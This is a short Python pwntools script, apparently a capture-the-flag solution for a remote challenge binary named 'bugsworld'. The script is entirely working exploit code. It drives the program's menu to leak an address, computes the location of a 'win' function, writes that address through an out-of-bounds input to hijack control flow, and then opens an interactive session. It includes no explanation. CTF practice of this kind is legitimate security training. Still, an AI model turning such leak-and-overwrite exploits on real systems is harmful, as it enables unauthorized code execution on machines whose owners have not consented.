from pwn import *

# p = process("./bugsworld")
# gdb.attach(p)

p = remote("chall.pwnoh.io", 13382)

p.recvuntil(b"> ")
p.sendline(b"3")
p.recvuntil(b"> ")
p.sendline(b"0 0 255")
p.recvline()
p.recvline()
leak = p.recvuntil(b"> ")

win = u64(leak[:6].ljust(8, b"\x00")) - 164
log.info(f"{hex(win)=}")

p.sendline(b"8")
p.recvuntil(b"> ")
p.sendline(b"0 0 0 0 0 0 31 " + str(win).encode())

p.recvuntil(b"> ")
p.sendline(b"2")
p.recvuntil(b"> ")
p.sendline(b"6 6")

p.interactive()